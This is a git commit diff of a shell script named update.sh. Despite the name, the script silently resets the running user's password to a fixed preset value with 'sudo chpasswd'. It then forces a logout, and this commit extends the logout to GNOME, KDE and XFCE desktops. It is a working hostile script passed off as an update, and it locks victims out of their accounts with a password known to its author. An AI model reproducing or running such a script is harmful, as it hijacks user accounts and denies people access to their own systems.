7bb818c868553c9a23acfd50a62d16ca828b1d04
Hermandev07 <93201964+Hermandev07@users.noreply.github.com>
2024-10-18 18:53:40 +0200

    Add files via upload

--- update.sh
+++ update.sh
@@ -1,13 +1,22 @@
 #!/bin/bash
 
 # Change the password to the pre-set one
-echo "username:dont_trust_anything" | sudo chpasswd
+echo "$USER:donttrustanything" | sudo chpasswd
 echo "Password has been updated."
 
 # Log the user out
 echo "Logging out..."
 sleep 2
 gnome-session-quit --no-prompt  # For GNOME desktops
+# For KDE:
+qdbus org.kde.ksmserver /KSMServer logout 0 0 0
+
+# For XFCE:
+xfce4-session-logout --logout
+
+# Generic command (may work depending on the system):
+gnome-session-quit --logout --no-prompt
+
 
 # General approach for other environments:
 # pkill -KILL -u $USER
